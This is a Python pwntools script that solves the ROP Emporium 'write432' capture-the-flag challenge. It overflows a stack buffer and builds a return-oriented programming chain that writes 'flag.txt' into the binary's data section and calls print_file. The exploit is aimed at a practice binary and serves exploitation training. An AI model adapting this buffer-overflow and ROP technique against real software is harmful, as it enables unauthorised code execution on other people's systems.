#!/usr/bin/env python3
# Solution to ROP Emporium write432
from pwn import *   # import pwntools

context.log_level = "debug"   # Debugging information
context.binary = elf = ELF("./write432")    # Set architecture info
io = process()    # Create a process with the loaded elf
rop = ROP(elf)    # Create the ROP object

# Pull the address of the data section
data_addr = elf.symbols.data_start
print(f"[+] Data address: {data_addr}")
ebp_to_edi_addr = p32(0x08048543) # 0x08048543: mov dword ptr [edi], ebp; ret; 
print(f"[+] ebp to address at edi: {ebp_to_edi_addr}")
pop_edi_pop_ebp = p32(0x080485aa)
print(f"[+] pop edi, pop ebp; ret: {pop_edi_pop_ebp}")

offset = 44

# rop.raw() to build our ropchain
# Place the data-section address into edi, "flag" into ebp and then move "flag" to the start of the data section 
rop.raw([pop_edi_pop_ebp, data_addr, "flag", ebp_to_edi_addr])
# Repeat the above but use the data section + 4 and move "".txt"
rop.raw([pop_edi_pop_ebp, data_addr + 0x4, ".txt", ebp_to_edi_addr])
# Call print file with the data section address
rop.print_file(data_addr)
# Build the ropchain
rop_chain = rop.chain()

payload = b""
payload += b"A" * offset
payload += rop_chain

write("payload.txt", payload)

io.recvuntil(b"> ")
io.sendline(payload)
io.recvuntil(b"Thank you!\n")
success(io.recv())
